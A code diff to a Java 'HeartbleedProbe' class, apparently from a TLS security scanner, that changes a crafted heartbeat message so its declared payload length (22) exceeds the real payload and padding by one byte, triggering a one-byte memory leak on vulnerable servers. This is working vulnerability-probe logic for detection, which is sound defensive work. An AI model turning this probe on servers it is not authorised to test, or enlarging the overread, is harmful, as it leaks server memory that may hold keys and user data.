@@ -63,8 +63,20 @@ public class HeartbleedProbe
                         .createWorkflowTrace(
                                 WorkflowTraceType.DYNAMIC_HANDSHAKE, RunningModeType.CLIENT);
         HeartbeatMessage heartbeatMessage = new HeartbeatMessage();
-        heartbeatMessage.setPayload(Modifiable.explicit(new byte[] {1, 3}));
-        heartbeatMessage.setPayloadLength(Modifiable.explicit(10));
+        // The payload consists of arbitrary content. We just set it to 5 "A" bytes.
+        heartbeatMessage.setPayload(Modifiable.explicit(new byte[] {65, 65, 65, 65, 65}));
+        // The sender of a HeartbeatMessage MUST use a random padding of at least 16 bytes.
+        // The padding of a received HeartbeatMessage message MUST be ignored. We set the padding
+        // to 16 "P" bytes.
+        heartbeatMessage.setPadding(
+                Modifiable.explicit(
+                        new byte[] {
+                            80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80, 80
+                        }));
+        // The length of the payload we want to override. We have 5 bytes of content and 16 bytes of
+        // padding. To not be
+        // very offensive, we set it to 22 which forces the server to leak one byte.
+        heartbeatMessage.setPayloadLength(Modifiable.explicit(22));
         trace.addTlsAction(new SendAction(heartbeatMessage));
         trace.addTlsAction(new ReceiveAction(new HeartbeatMessage()));
         return trace;
